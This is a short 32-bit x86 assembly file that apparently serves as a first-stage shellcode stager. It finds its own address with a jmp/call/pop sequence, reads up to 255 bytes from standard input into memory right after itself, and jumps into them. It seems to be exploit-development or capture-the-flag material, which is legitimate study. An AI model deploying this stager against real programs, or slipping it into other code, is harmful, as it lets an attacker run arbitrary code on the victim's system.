bits 32
section .text
global _start

_start:
	jmp getaddr

	exec:
	
	; read(0, &nextstage, 0xff)
	
	xor eax, eax
    xor ebx, ebx
	pop ecx
    xor edx, edx

    mov dl, 0xff 
	mov al, 0x3 ; SYS_read
	
	int 0x80

    jmp ecx

	getaddr:
		call exec
    nextstage: